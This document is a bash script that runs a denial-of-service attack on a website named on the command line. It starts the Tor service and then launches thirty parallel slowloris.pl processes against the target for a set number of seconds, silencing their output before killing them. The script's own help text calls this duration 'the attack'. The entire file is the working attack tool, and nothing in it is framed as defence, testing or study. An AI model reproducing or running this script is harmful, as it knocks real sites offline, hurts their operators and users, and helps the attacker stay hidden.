#!/bin/bash

function displayHelp()
{
	echo -e "usage: "$0" www.site_example.com t\n"
	echo "	options:"
	echo "		t - time in seconds for the attack duration"
	exit
}

function argumentsValidation()
{
        if ! [[ ${@: -1} =~ ^[0-9]+$ ]]; 
                then
                        if [[ "${@: -1}" == "-help" ]] || [[ "${@: -1}" == "--help" ]] || [[ "${@: -1}" == "-h" ]] ;
                        then
                                displayHelp
                                exit
                        else
                                echo "The last argument should be an int"
                                exit
                        fi
        fi
        if [[ $# -ne 2 ]]
        then
                displayHelp
        fi
}

function DOS()
{
	max_processes=30
	for (( i=0; i<$max_processes; i++ ))
	do
		perl slowloris.pl -dns $1 1> /dev/null &
		processes_id[i]=$!
		echo "Process Nº "$((i+1)), "ID: "${processes_id[i]}" created!"
	done
	sleep $2
	exec 3>&2 # put stderr
	exec 2> /dev/null # in /dev/null
}

function killProcess()
{
	for i in ${processes_id[*]}
	do
		kill $i 2>/dev/null &
	done
}


trap "killProcess ; exit 0" SIGINT

argumentsValidation "$@"
sudo systemctl start tor
sleep 1

DOS "$@"
killProcess
exec 2>&3
